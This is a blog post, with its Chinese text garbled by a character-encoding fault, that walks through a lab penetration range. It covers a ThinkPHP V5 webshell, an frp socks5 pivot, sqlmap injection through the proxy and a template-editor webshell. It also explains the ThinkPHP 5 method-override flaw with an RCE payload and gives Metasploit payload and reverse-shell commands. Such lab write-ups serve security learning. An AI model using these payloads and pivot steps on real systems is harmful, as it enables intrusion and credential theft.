<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title> | blog</title><script src="https://cdn.bootcss.com/valine/1.4.4/Valine.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="blog" type="application/atom+xml">
</head><body><header><nav><a href="/">Home</a><a href="/archives/">Archives</a><a href="/schedule/">Synopsis</a></nav></header><main style="flex-direction: row-reverse"><article><div id="post-bg"><div id="post-title"><h1></h1><hr></div><div id="post-content"><p>title: vul-1<br>date: 2021-09-12 16:15:28<br>tags: vulstrack<br>categories: æ¸—é€å®æˆ˜</p>
<h3 id="vul-1"><a href="#vul-1" class="headerlink" title="vul-1"></a>vul-1</h3><h4 id="ç¬¬ä¸€å±‚ä¸»æœº"><a href="#ç¬¬ä¸€å±‚ä¸»æœº" class="headerlink" title="[ç¬¬ä¸€å±‚ä¸»æœº]"></a>[ç¬¬ä¸€å±‚ä¸»æœº]</h4><ul>
<li><p>æ‰“å¼€<a target="_blank" rel="noopener" href="http://10.203.87.107/%E9%9D%B6%E5%9C%BA%EF%BC%8CThinkPHP">http://10.203.87.107/é¶åœºï¼ŒThinkPHP</a> V5æ˜ å…¥çœ¼å¸˜</p>
<p><img src="/2021/09/12/red1/QQ%E6%88%AA%E5%9B%BE20210916160243.png" alt="QQæˆªå›¾20210916160243"></p>
</li>
<li><p>è¿™ä¸ªç»å…¸çš„CMSè§äº†å¾ˆå¤šæ¬¡äº†ï¼Œç¥­å‡ºå¤§å“¥æœå¯»åˆ°çš„ç¥å™¨ï¼Œç›´æ¥ä¼ ğŸ</p>
<p><img src="/2021/09/12/red1/QQ%E6%88%AA%E5%9B%BE20210916160625.png" alt="QQæˆªå›¾20210916160625"></p>
</li>
<li><p>èšå‰‘é“¾æ¥ï¼Œé“¾æ¥æˆåŠŸ getshell</p>
<p><img src="/2021/09/12/red1/QQ%E6%88%AA%E5%9B%BE20210916160817.png" alt="QQæˆªå›¾20210916160817"></p>
</li>
</ul>
<h4 id="ç¬¬äºŒå±‚ä¸»æœº"><a href="#ç¬¬äºŒå±‚ä¸»æœº" class="headerlink" title="[ç¬¬äºŒå±‚ä¸»æœº]"></a>[ç¬¬äºŒå±‚ä¸»æœº]</h4><ul>
<li>è·å–ä¸»æœºä¿¡æ¯ï¼Œå‘ç°äº†å…¶ä¸ºåŒç½‘å¡ï¼Œç›´æ¥è®¿é—®å…¶å¦ä¸€å—ç½‘å¡æ— æ³•æˆåŠŸï¼Œåº”è¯¥æ˜¯åœ¨è¯¥ä¸»æœºçš„å†…ç½‘ä¸Šï¼Œåˆ¤æ–­æ˜¯ä¸º<code>192.168.22.0/24</code>ç½‘æ®µçš„ç¬¬äºŒå±‚ä¸»æœº</li>
</ul>
<p><img src="/2021/09/12/red1/QQ%E6%88%AA%E5%9B%BE20210916160937.png" alt="QQæˆªå›¾20210916160937"></p>
<ul>
<li>ä½¿ç”¨frpå°†å…¶æµé‡ä»£ç†å‡ºæ¥</li>
</ul>
<p>æ„é€ ä¿®æ”¹<code>frpc.ini</code>ä¸­çš„é…ç½®ï¼Œå¹¶æŠŠ<code>frpc</code>å’Œ<code>frpc.ini</code>ä¸Šä¼ åˆ°èšå‰‘ä¸Šï¼Œå¹¶ä¿®æ”¹æƒé™ä¸º<code>0777</code></p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">10.203</span>.<span class="number">87.175</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[socks5]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">8520</span></span><br></pre></td></tr></table></figure>



<p><img src="/2021/09/12/red1/QQ%E6%88%AA%E5%9B%BE20210916161621.png" alt="QQæˆªå›¾20210916161621"></p>
<ul>
<li>åœ¨è™šæ‹Ÿæœºä¸Šä½¿ç”¨è¿è¡Œ<code>frps</code>å¯¹é¶åœºè¿›è¡Œç›‘å¬ï¼Œåœ¨ç¬¬ä¸€å±‚ä¸»æœºè¿è¡Œ<code>frpc</code>è¿›è¡Œæµé‡çš„è½¬å‘ï¼Œå¯¹æµè§ˆå™¨è¿›è¡Œä»£ç†åï¼Œè®¿é—®å…¶æ‰€æœ‰cæ®µï¼Œæœ€æ€»å‘ç°ç¬¬äºŒå±‚ä¸»æœºIPä¸º<code>192.168.22.129</code></li>
</ul>
<p><img src="/2021/09/12/red1/QQ%E6%88%AA%E5%9B%BE20210916162521.png" alt="QQæˆªå›¾20210916162521"></p>
<ul>
<li>æ‰“å¼€é¶åœºååˆæ˜¯ä¸€ä¸ªCMS</li>
</ul>
<p><img src="/2021/09/12/red1/QQ%E6%88%AA%E5%9B%BE20210916162318.png" alt="QQæˆªå›¾20210916162318"></p>
<ul>
<li>åŸæœ¬æ˜¯æƒ³æ‰¾CMSçš„ç‰ˆæœ¬æ¥ç€ï¼Œæ²¡æƒ³åˆ°åœ¨æºç ä¸­æ‰¾åˆ°äº†æç¤ºä¿¡æ¯ï¼Œä¸€ä¸ªSQLæ³¨å…¥ç‚¹</li>
</ul>
<p><img src="/2021/09/12/red1/QQ%E6%88%AA%E5%9B%BE20210915134121.png" alt="QQæˆªå›¾20210915134121"></p>
<ul>
<li>ä½¿ç”¨sqlmapå¯¹å…¶è¿›è¡Œçˆ†ç ´</li>
</ul>
<p>å› ä¸ºæ­¤æ—¶ä½¿ç”¨socks5ä»£ç†è®¿é—®çš„ç½‘ç«™ï¼Œæ‰€ä»¥åœ¨ä½¿ç”¨sqlmapçš„æ—¶å€™ä¹Ÿéœ€è¦å¯¹å…¶è¿›è¡Œä»£ç†</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --proxy=socks5://10.203.87.175:8520 -u <span class="string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span> -p keyword</span><br></pre></td></tr></table></figure>

<p><code>dump</code>åå¾—åˆ°åå°ç™»å½•è´¦å·å’Œå¯†ç </p>
<p><img src="/2021/09/12/red1/QQ%E6%88%AA%E5%9B%BE20210915144541.png" alt="QQæˆªå›¾20210915144541"></p>
<ul>
<li>åå°åœ°å€ä¸º<code>http://192.168.22.129/index.php?r=admini</code>,è¾“å…¥è´¦å·å¯†ç åè¿›å…¥åå°</li>
</ul>
<p><img src="/2021/09/12/red1/QQ%E6%88%AA%E5%9B%BE20210916163251.png" alt="QQæˆªå›¾20210916163251"></p>
<ul>
<li>åœ¨æ”¹åå°çš„æ¨¡æ¿é€‰é¡¹ä¸­ï¼Œå¯ä»¥ä»»æ„ç¼–è¾‘æ–‡ä»¶å†…å®¹ï¼Œåœ¨æŠ¥é”™ç•Œé¢ä¼ ğŸ</li>
</ul>
<p><img src="/2021/09/12/red1/QQ%E6%88%AA%E5%9B%BE20210917154707.png" alt="QQæˆªå›¾20210917154707"></p>
<ul>
<li>èšå‰‘é“¾æ¥,getshell</li>
</ul>
<h3 id="æ·±å…¥äº†è§£"><a href="#æ·±å…¥äº†è§£" class="headerlink" title="æ·±å…¥äº†è§£"></a>æ·±å…¥äº†è§£</h3><h5 id="ThinkPHP-v5æ¼æ´è§£æ"><a href="#ThinkPHP-v5æ¼æ´è§£æ" class="headerlink" title="ThinkPHP v5æ¼æ´è§£æ"></a>ThinkPHP v5æ¼æ´è§£æ</h5><ul>
<li>æ¼æ´ç®€ä»‹</li>
</ul>
<p>ç”±äºæ¡†æ¶å¯¹æ§åˆ¶å™¨åæ²¡æœ‰è¿›è¡Œè¶³å¤Ÿçš„æ£€æµ‹ä¼šå¯¼è‡´åœ¨æ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹å¯èƒ½çš„getshellæ¼æ´</p>
<p>å®é™…ä¸Šå°±æ˜¯ <strong>ç¨‹åºæœªå¯¹æ§åˆ¶å™¨è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥ç”¨<code>\</code>è°ƒç”¨ä»»æ„ç±»æ–¹æ³•</strong></p>
<ul>
<li>å½±å“ç‰ˆæœ¬</li>
</ul>
<p>5.0 â€“ 5.1</p>
<ul>
<li>æ¼æ´åŸç†ä»¥åŠåˆ©ç”¨æ–¹æ³•</li>
</ul>
<p>æ–‡ä»¶è·¯å¾„ ï¼š\thinkphp\library\thin\Request.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * å½“å‰çš„è¯·æ±‚ç±»å‹</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span>  bool $origin  æ˜¯å¦è·å–åŸå§‹è¯·æ±‚ç±»å‹</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">method</span>(<span class="params"><span class="variable">$origin</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$origin</span>) &#123;</span><br><span class="line">           <span class="comment">// è·å–åŸå§‹è¯·æ±‚ç±»å‹</span></span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;server(<span class="string">&#x27;REQUEST_METHOD&#x27;</span>) ?: <span class="string">&#x27;GET&#x27;</span>;</span><br><span class="line">       &#125; <span class="keyword">elseif</span> (!<span class="keyword">$this</span>-&gt;method) &#123;</span><br><span class="line">           <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;var_method&#x27;</span>]])) &#123;</span><br><span class="line">               <span class="keyword">$this</span>-&gt;method    = strtoupper(<span class="variable">$_POST</span>[<span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;var_method&#x27;</span>]]);</span><br><span class="line">               <span class="variable">$method</span>          = strtolower(<span class="keyword">$this</span>-&gt;method);</span><br><span class="line">               <span class="keyword">$this</span>-&gt;&#123;<span class="variable">$method</span>&#125; = <span class="variable">$_POST</span>;</span><br><span class="line">           &#125; <span class="keyword">elseif</span> (<span class="keyword">$this</span>-&gt;server(<span class="string">&#x27;HTTP_X_HTTP_METHOD_OVERRIDE&#x27;</span>)) &#123;</span><br><span class="line">               <span class="keyword">$this</span>-&gt;method = strtoupper(<span class="keyword">$this</span>-&gt;server(<span class="string">&#x27;HTTP_X_HTTP_METHOD_OVERRIDE&#x27;</span>));</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">$this</span>-&gt;method = <span class="keyword">$this</span>-&gt;server(<span class="string">&#x27;REQUEST_METHOD&#x27;</span>) ?: <span class="string">&#x27;GET&#x27;</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;method;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>



<p>å…¶ä¸­</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;method    = strtoupper(<span class="variable">$_POST</span>[<span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;var_method&#x27;</span>]]);</span><br><span class="line"><span class="variable">$method</span> = strtolower(<span class="keyword">$this</span>-&gt;method); </span><br><span class="line"><span class="keyword">$this</span>-&gt;&#123;<span class="variable">$method</span>&#125; = <span class="variable">$_POST</span>;</span><br></pre></td></tr></table></figure>



<p><code>$method</code>å˜é‡æ˜¯<code>$this-&gt;method</code>, å…¶åŒç­‰äºPOSTçš„<code>â€œ_methodâ€</code>å‚æ•°å€¼ï¼Œè¯¥å¤„å­˜åœ¨ä¸€ä¸ªå˜é‡è¦†ç›–ï¼Œæˆ‘ä»¬å¯ä»¥è¦†ç›–<code>$filter</code>å±æ€§å€¼</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=exec&amp;f=calc.exe&amp;&amp;_method=filter&amp;</span><br></pre></td></tr></table></figure>



<p>è®¿é—®åä¼šå‡ºç°ä¸€ä¸ªè­¦å‘Šçº§åˆ«çš„å¼‚å¸¸ï¼Œå¯¼è‡´ç¨‹åºç»ˆæ­¢ï¼Œ</p>
<h5 id="msfçš„ä½¿ç”¨"><a href="#msfçš„ä½¿ç”¨" class="headerlink" title="msfçš„ä½¿ç”¨"></a>msfçš„ä½¿ç”¨</h5><h6 id="msfvenomåˆ¶ä½œæœ¨é©¬"><a href="#msfvenomåˆ¶ä½œæœ¨é©¬" class="headerlink" title="msfvenomåˆ¶ä½œæœ¨é©¬"></a>msfvenomåˆ¶ä½œæœ¨é©¬</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show payloads  <span class="comment">#æŸ¥çœ‹æ‰€æœ‰payloadï¼Œæ ¹æ®ç³»ç»Ÿå’Œéœ€è¦æ„é€  msfvenomæœ¨é©¬</span></span><br><span class="line">msfvenom -p payload lhost=æœ¬æœºip lport=ç«¯å£ -f å†™å…¥æ–‡ä»¶æ ¼å¼ &gt; å†™å…¥æ–‡ä»¶å</span><br></pre></td></tr></table></figure>



<h6 id="exploitæ¨¡å—"><a href="#exploitæ¨¡å—" class="headerlink" title="exploitæ¨¡å—"></a>exploitæ¨¡å—</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler   <span class="comment">#è¿›å…¥ç®¡ç†å·¥å…·</span></span><br><span class="line">options <span class="comment">#æŸ¥çœ‹æ”»å‡»é…ç½®</span></span><br><span class="line"><span class="built_in">set</span> lport ç«¯å£å·/lhost æ”»å‡»æœºæœ¬æœº/payload payload <span class="comment">#è®¾ç½®</span></span><br><span class="line">run <span class="comment">#ç›‘å¬ç›®æ ‡æœºæµé‡ï¼Œgetshell</span></span><br><span class="line"><span class="comment">#msfvenomç”Ÿæˆæœ¨é©¬éœ€è¦ä¼ å…¥åˆ°æ”»å‡»æœº</span></span><br><span class="line">sessions -i	<span class="comment">#æŸ¥çœ‹ç›‘å¬ä¼šè¯</span></span><br><span class="line">sessions -i -æ•°å­— <span class="comment">#è¿›å…¥ä¼šè¯</span></span><br></pre></td></tr></table></figure>



<h6 id="meterperteræ¨¡å—"><a href="#meterperteræ¨¡å—" class="headerlink" title="meterperteræ¨¡å—"></a>meterperteræ¨¡å—</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getuid 	<span class="comment">#æŸ¥çœ‹å½“å‰æƒé™</span></span><br><span class="line">sysinfo <span class="comment">#æ˜¾ç¤ºè¿œç¨‹ä¸»æœºç³»ç»Ÿä¿¡æ¯</span></span><br><span class="line">route 	<span class="comment">#æŸ¥çœ‹è·¯ç”±ä¿¡æ¯</span></span><br><span class="line">route add -s ç½‘æ®µ <span class="comment">#æ·»åŠ è·¯ç”±</span></span><br><span class="line">search socks	<span class="comment">#å¯»æ‰¾ä»£ç†æ¨¡å—	</span></span><br><span class="line">vim /etc/proxychains4.conf	<span class="comment">#é…ç½®msfæœ¬åœ°ä»£ç†</span></span><br></pre></td></tr></table></figure><div id="paginator"></div></div><div id="post-footer"><hr><a href="/2021/09/13/ctf3/">â† Prev easy_serialize_php</a><span style="color: #fe2"> | </span><a href="/2021/09/08/XXE-CTF/">XXE_CTF Next â†’</a><hr></div><div id="bottom-btn"><a id="to-index" href="#post-index" title="index">â‰¡</a><a id="to-top" href="#post-title" title="to top">âˆ§</a></div><div id="Valine"></div><script>new Valine({
 el: '#Valine'
 , appId: ''
 , appKey: ''
 , placeholder: 'æ­¤æ¡è¯„è®ºå§”æ‰˜ä¼é¹…ç‰©æµå‘é€'
})</script></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/"> Dr.Mr.Li</a></h1><section id="total"><a id="total-archives" href="/archives"><span class="total-title">Archives Total:</span><span class="total-number">33</span></a><div id="total-tags"><span class="total-title">Tags:</span><span class="total-number">18</span></div><div id="total-categories"><span class="total-title">Categories:</span><span class="total-number">6</span></div></section></div><div id="aside-block"></div><footer style="text-align: right"><nobr><span class="text-title">Â©</span><span class="text-content">1970 to 2020</span></nobr><wbr><nobr><span class="text-title">ICP</span><span class="text-content">â€”â€”å¤‡æ¡ˆå·â€”â€”</span></nobr><wbr><wbr><nobr>published with&nbsp;<a target="_blank" rel="noopener" href="http://hexo.io">Hexo&nbsp;</a></nobr><wbr><nobr>Theme&nbsp;<a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknight&nbsp;</a></nobr><wbr><nobr>by&nbsp;<a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/arknights.js"></script><script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/10.1.2/highlight.min.js"></script></body></html>